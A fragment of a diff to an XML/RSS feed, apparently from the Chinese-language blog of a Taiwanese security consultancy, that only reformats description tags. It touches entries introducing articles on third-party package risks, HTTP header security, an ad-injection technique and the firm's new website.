 &lt;p&gt;在服務眾多客戶之後，我們深知這些問題的嚴重性。以下我們將就幾個經典的案例來說明使用第三方套件所要擔負的風險，並且分享我們對於第三方套件的安全建議。&lt;/p&gt;
 
@@ -5445,8 +5366,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>HTTP Headers 的資安議題 (1)</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;隨著駭客攻擊事件日益漸增，原本經常被大眾所忽視的網站資安問題，現在已經逐漸受到重視。但是，許多企業主或開發人員雖然很想強化網站的安全性，卻不知道該如何從何著手。&lt;/p&gt;
 
@@ -5565,8 +5485,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>奇優廣告 Qiyou 廣告手法剖析</title>
-                <description>
-&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;
+                <description>&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;
 
 &lt;p&gt;今天我們來談談「廣告顯示手法」。不少廣告商為了要增加廣告的曝光以及點擊率，會使用各種手法強迫使用者顯示廣告。例如彈出式視窗、內嵌廣告、強制跳轉等等。但這樣的手法有什麼好提的呢？今天有一個很特別的案例，讓我們來看看一個網站「&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com 極速漫畫&lt;/a&gt;」。&lt;/p&gt;
 
@@ -5644,8 +5563,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>DEVCORE 新網站上線！</title>
-                <description>
-&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;
+                <description>&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;
 非常感謝專業的 &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; 幫我們設計精美的網站！&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;我們目前主要服務項目為滲透測試、資安教育訓練、資安事件處理、資安顧問服務，&lt;br /&gt;
